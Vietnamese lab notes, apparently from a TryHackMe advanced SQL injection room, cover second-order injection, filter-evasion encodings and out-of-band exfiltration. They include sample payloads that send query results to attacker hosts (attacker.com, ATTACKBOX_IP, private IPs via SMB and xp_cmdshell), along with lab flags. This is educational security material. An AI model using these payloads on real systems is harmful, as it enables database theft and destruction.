# SQL Out-of-band

- Out-of-band SQL injection được sử dụng khi kẻ tấn công không thể sử dụng cùng một kênh để khởi chạy cuộc tấn công và thu thập kết quả hoặc khi phản hồi của máy chủ không ổn định. Kỹ thuật này dựa vào máy chủ cơ sở dữ liệu thực hiện yêu cầu out-of-band (ví dụ: HTTP hoặc DNS ) để gửi kết quả truy vấn đến kẻ tấn công. HTTP thường được sử dụng trong out-of-band SQL injection để gửi  kết quả truy vấn đến máy chủ của kẻ tấn công.

## Second-Order SQL Injection

- Còn được gọi là tiêm SQL lưu trữ , khai thác các lỗ hổng trong đó dữ liệu đầu vào do người dùng cung cấp được lưu và sau đó được sử dụng trong một phần khác của ứng dụng, có thể sau một số quá trình xử lý ban đầu. Kiểu tấn công này nguy hiểm hơn vì mã SQL độc hại không cần phải ngay lập tức dẫn đến lỗi cú pháp SQL hoặc các vấn đề rõ ràng khác, khiến việc phát hiện bằng các kỹ thuật xác thực đầu vào tiêu chuẩn trở nên khó khăn hơn.

- Truy cập ứng dụng cho phép người dùng thêm sách mới thông qua trang web ( add.php):

![image](https://github.com/user-attachments/assets/bec83039-c6fc-4dd6-bc47-6c1738a6860b)

- Thử thêm một cuốn sách:

![image](https://github.com/user-attachments/assets/801d0010-9a14-4a01-b38c-0a56931199bd)

- Thử chèn một đoạn mã update tên tất cả các quyển sách thành "compromised" vào ssn:

![image](https://github.com/user-attachments/assets/becf70f0-db1e-45a5-9f04-4182eef71c1f)

- Truy cập trang update

![image](https://github.com/user-attachments/assets/9095c242-5048-48e8-afb0-d2c3a7a963a1)

- Update quyển sách vừa chèn mã => các trường book_name đều bị thay đổi thành compromised:

![image](https://github.com/user-attachments/assets/86fc8a97-6858-44a4-bde7-072c57a2c49b)

- flag1 : `THM{SO_HACKED}`

- Add sách mới với ssn là doạn mã sql nhàm xóa bảng hello:

![image](https://github.com/user-attachments/assets/866bbee9-9a9b-445d-b709-39944930179d)

- Truy cập trang cập nhập để cập nhập cuốn sách vừa add để xóa bảng hello và lấy flag:

![image](https://github.com/user-attachments/assets/7a4d7634-39aa-444c-8412-13e7939ebe10)

- flag2 : `THM{Table_Dropped}`

## Kỹ thuật tránh bộ lọc

### Mã hóa ký tự

- Mã hóa URL: Mã hóa URL là một phương pháp phổ biến trong đó các ký tự được biểu diễn bằng dấu phần trăm (%) theo sau là giá trị ASCII của chúng theo hệ thập lục phân. Ví dụ, tải trọng ' OR 1=1--có thể được mã hóa thành %27%20OR%201%3D1--. 

- Mã hóa thập lục phân: Mã hóa thập lục phân là một kỹ thuật hiệu quả khác để xây dựng các truy vấn SQL sử dụng các giá trị thập lục phân. Ví dụ, truy vấn SELECT * FROM users WHERE name = 'admin'có thể được mã hóa thành SELECT * FROM users WHERE name = 0x61646d696e

- Unicode Encoding: Mã hóa Unicode biểu diễn các ký tự sử dụng chuỗi thoát Unicode.  Ví dụ, chuỗi admin có thể được mã hóa thành \u0061\u0064\u006d\u0069\u006e.

- Giao diên trang search for book:

![image](https://github.com/user-attachments/assets/6d2becda-e5ec-49f3-a5ab-53f054993a3a)

- Nhập truy vấn sau `hacker'`:

![image](https://github.com/user-attachments/assets/8bb1a5b8-a78e-4641-80aa-8936cf6a2ec4)

- Mã lỗi: `1064`

- Thử chèn đoạn mã để lấy cuốn sách có id=6:

![image](https://github.com/user-attachments/assets/611bfd8b-2189-4bc1-b412-cca91ce4843d)

- Từ OR đã bị bộ lọc loại bỏ

- Ta thử sử dụng toán tử || để lấy cuốn có id=6 :

![image](https://github.com/user-attachments/assets/7737d232-e2e8-4da8-89e9-1066703ce9ac)

- Ta cũng có thể lấy tất cả các cuốn sách:

![image](https://github.com/user-attachments/assets/d0eac96e-0c7f-4f29-a5ef-594d078b31e8)

- Tên cuốn sách: `Animal Series`

### Tiêm SQL không trích dẫn

- Kỹ thuật tiêm SQL không trích dẫn được sử dụng khi ứng dụng lọc dấu ngoặc đơn, dấu ngoặc kép hoặc ký tự thoát.

  - Sử dụng giá trị số
 
  - Sử dụng chú thích SQL
 
  - Sử dụng hàm CONCAT() : Kẻ tấn công có thể sử dụng các hàm SQL như CONCAT() để xây dựng chuỗi không có dấu ngoặc kép. Ví dụ, CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)xây dựng chuỗi admin.

### Không được phép có khoảng cách

- Khi không được phép sử dụng khoảng trắng hoặc bị lọc ra, có thể sử dụng nhiều kỹ thuật khác nhau để vượt qua hạn chế này.

  - Bình luận để thay thế khoảng trắng : Một phương pháp phổ biến là sử dụng chú thích SQL ( /**/) để thay thế khoảng trắng. Ví dụ, SELECT/**//*FROM/**/users/**/WHERE/**/name/**/='admin'
 
  - Ký tự Tab hoặc Newline : Một cách tiếp cận khác là sử dụng ký tự tab ( \t) hoặc newline ( \n) thay thế cho khoảng trắng.
 
  - Ký tự thay thế : Một phương pháp hiệu quả là sử dụng các ký tự được mã hóa URL thay thế biểu diễn các loại khoảng trắng khác nhau, chẳng hạn như %09(tab ngang), %0A (nạp dòng), ( %0C nạp biểu mẫu), %0D(trở về đầu dòng) và %A0(khoảng trắng không ngắt dòng). 

- Ví dụ:

  - ĐƯờng dẫn dưới là một endpoin tìm tên người dùng dựa vào tham số username:

![image](https://github.com/user-attachments/assets/aa579d7d-68f1-43f2-bff8-1b1eb0e48bdd)

  - Đây là bộ lọc đã lọc bỏ khoảng trắng và các từ khóa:

![image](https://github.com/user-attachments/assets/d97553c8-744a-484d-915b-0f53d1a4e8a6)

  - Chèn đoạn mã sau, khoảng trắng được thay thế bằng %0A (dấu nạp dòng):

![image](https://github.com/user-attachments/assets/00ca8be4-7bb9-4ac7-a7b7-d03fe703c1e1)

  - Mật khẩu attacker: `tesla`

  - Câu trả lời đúng: `c`

## Out-Of-Band SQL Injection

- OOB là kỹ thuật để leak dữ liệu ra ngoài hoặc thực hiện các hoạt động độc hại khi các phương pháp trực tiếp hoặc truyền thống không hiệu quả. In-band kẻ tấn công dựa vào cùng một kênh để tấn công và truy xuất dữ liệu. Các kỹ thuật ngoài băng tần tận dụng các tính năng như yêu cầu HTTP , truy vấn DNS , giao thức SMB hoặc các giao thức mạng khác mà máy chủ cơ sở dữ liệu có thể truy cập, cho phép kẻ tấn công vượt qua tường lửa, hệ thống phát hiện xâm nhập và các biện pháp bảo mật khác.

- Một trong những lợi thế chính của Out-of-band SQL injection là tính ẩn và độ tin cậy của nó. Bằng cách sử dụng các kênh truyền thông khác nhau , kẻ tấn công có thể giảm thiểu rủi ro bị phát hiện và duy trì kết nối liên tục với hệ thống bị xâm phạm.

![image](https://github.com/user-attachments/assets/051c8fd6-c161-4d0a-bcab-526e52e27e80)

### Kỹ thuật trong các cơ sở dữ liệu khác nhau

#### MySQL và MariaDB

- Trong MySQL hoặc MariaDB, Out-of-band SQL injection có thể đạt được bằng cách sử dụng  lệnh SELECT ... INTO OUTFILE hoặc load_file . Lệnh này cho phép kẻ tấn công ghi kết quả của truy vấn vào một tệp trên hệ thống tệp của máy chủ.

`SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';`

- Kẻ tấn công sau đó có thể truy cập tệp này thông qua chia sẻ SMB hoặc máy chủ HTTP chạy trên máy chủ cơ sở dữ liệu, do đó đánh cắp dữ liệu thông qua một kênh thay thế.

#### Microsoft SQL Server (MSSQL)

- Trong MSSQL, Out-of-band SQL injection có thể được thực hiện bằng các tính năng như xp_cmdshell , cho phép thực thi lệnh shell trực tiếp từ các truy vấn SQL . Điều này có thể được tận dụng để ghi dữ liệu vào một tệp có thể truy cập thông qua chia sẻ mạng:

`EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';`

- Ngoài ra, OPENROWSETcó BULK INSERTthể được sử dụng để tương tác với các nguồn dữ liệu bên ngoài, tạo điều kiện cho việc truyền dữ liệu qua các kênh OOB.

#### Oracle

- Trong Oracle databases,Out-of-band SQL injection có thể được thực hiện bằng cách sử dụng các gói UTL_HTTP hoặc UTL_FILE . Ví dụ, gói UTL_HTTP có thể được sử dụng để gửi các yêu cầu HTTP với dữ liệu nhạy cảm:

![image](https://github.com/user-attachments/assets/0cec2cab-8a2e-441d-bddb-1a9e0ff8840b)


### Ví dụ 

- Các kỹ thuật tiêm SQL ngoài băng tần trong MySQL và MariaDB có thể sử dụng nhiều giao thức mạng khác nhau để trích xuất dữ liệu. Các phương pháp chính bao gồm trích xuất DNS , yêu cầu HTTP và chia sẻ SMB . Mỗi kỹ thuật này có thể được áp dụng tùy thuộc vào khả năng của môi trường MySQL/MariaDB và thiết lập mạng.

#### HTTP

- Bằng cách tận dụng các hàm cơ sở dữ liệu cho phép các yêu cầu HTTP , kẻ tấn công có thể gửi dữ liệu nhạy cảm trực tiếp đến máy chủ web mà chúng kiểm soát. Phương pháp này khai thác các chức năng cơ sở dữ liệu có thể tạo các kết nối HTTP đi . Mặc dù MySQL và MariaDB không hỗ trợ các yêu cầu HTTP gốc , nhưng điều này có thể được thực hiện thông qua các tập lệnh bên ngoài hoặc User Defined Functions (UDF) nếu cơ sở dữ liệu được cấu hình để cho phép các hoạt động như vậy.

- Đầu tiên, UDF cần được tạo và cài đặt để hỗ trợ các yêu cầu HTTP . Thiết lập này phức tạp và thường liên quan đến cấu hình bổ sung. Một truy vấn ví dụ sẽ trông như thế này `SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;`


#### SMB exfiltration

- SMB exfiltration liên quan đến việc ghi kết quả truy vấn vào một chia sẻ SMB trên máy chủ bên ngoài. Kỹ thuật này đặc biệt hiệu quả trong môi trường Windows nhưng cũng có thể được cấu hình trong hệ thống Linux với thiết lập phù hợp. một truy vấn ví dụ sẽ trông như thế này `SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';`


#### Ví dụ thực tế:

- khởi chạy máy attackbox và thực hiện lệnh sau:

![image](https://github.com/user-attachments/assets/260b8d00-51fb-47b4-a841-7047397eb283)

- Chèn đoạn mã sau vào tham số vitsitor_name: 1'; SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt'; --

![image](https://github.com/user-attachments/assets/01bcc7e9-357b-424f-8dbc-470ec24126fc)

- Kiểm tra trong máy attackbox tại /tmp:

![image](https://github.com/user-attachments/assets/a314ad5b-15b4-40f7-b81d-fc2509823a79)

- Đổi tên output file để lấy basedir:

![image](https://github.com/user-attachments/assets/4832eab6-0851-4fe0-8270-1c27104320d6)

- Kiểm tra máy attackbox:

![image](https://github.com/user-attachments/assets/947a0deb-d309-4abe-898b-c6e044618c5e)

## Các kỹ thuật khác

### Tiêm tiêu đề HTTP

- Tiêu đề HTTP có thể mang dữ liệu đầu vào của người dùng, có thể được sử dụng trong các truy vấn SQL ở phía máy chủ. tiêm tác nhân người dùngNếu các dữ liệu đầu vào này không được khử trùng, nó có thể dẫn đến việc tiêm SQL . Kỹ thuật này bao gồm việc thao túng các tiêu đề HTTP (như User-Agent , Referer hoặc X-Forwarded-For ) để tiêm các lệnh SQL . Máy chủ có thể ghi lại các tiêu đề này hoặc sử dụng chúng trong các truy vấn SQL . Ví dụ: tiêu đề User-Agent độc hại sẽ trông giống như  User-Agent: ' OR 1=1; --.  Nếu máy chủ bao gồm tiêu đề User-Agent trong truy vấn SQL mà không khử trùng, nó có thể dẫn đến việc tiêm SQL.

![image](https://github.com/user-attachments/assets/b869e33d-8979-4697-bf86-5c0a8b182147)

![image](https://github.com/user-attachments/assets/74396187-acb9-4030-a997-bfa132cfcb0e)

### Khai thác các thủ tục lưu trữ

- Stored procedure là các quy trình được lưu trữ trong cơ sở dữ liệu có thể thực hiện nhiều hoạt động khác nhau, chẳng hạn như chèn, cập nhật hoặc truy vấn dữ liệu. Mặc dù các quy trình được lưu trữ có thể giúp cải thiện hiệu suất và đảm bảo tính nhất quán, nhưng chúng cũng có thể dễ bị SQL injection nếu không được xử lý đúng cách.

![image](https://github.com/user-attachments/assets/bea01840-6c81-429e-b9db-61415dd0034a)

- Stored procedure là các câu lệnh SQL được biên dịch trước có thể được thực thi như một đơn vị duy nhất. Chúng được lưu trữ trong cơ sở dữ liệu và có thể được các ứng dụng gọi để thực hiện các tác vụ cụ thể. Stored procedure có thể chấp nhận các tham số, điều này có thể khiến chúng linh hoạt và mạnh mẽ. Tuy nhiên, nếu các tham số này không được khử trùng đúng cách, chúng có thể gây ra các lỗ hổng SQL injection.

![image](https://github.com/user-attachments/assets/a1d3a8bf-7cd5-4915-8585-5001e77bd9a8)

### Tiêm  XML và JSON

- Các ứng dụng phân tích cú pháp dữ liệu XML hoặc JSON và sử dụng dữ liệu đã phân tích cú pháp trong các truy vấn SQL có thể dễ bị tấn công nếu chúng không khử trùng đúng cách các đầu vào. Tấn công XML và JSON liên quan đến việc đưa dữ liệu độc hại vào các cấu trúc XML hoặc JSON sau đó được sử dụng trong các truy vấn SQL . Điều này có thể xảy ra nếu ứng dụng trực tiếp sử dụng các giá trị đã phân tích cú pháp trong các câu lệnh SQL .

![image](https://github.com/user-attachments/assets/88ea2f94-ae42-46d0-816d-b0671d2a7790)




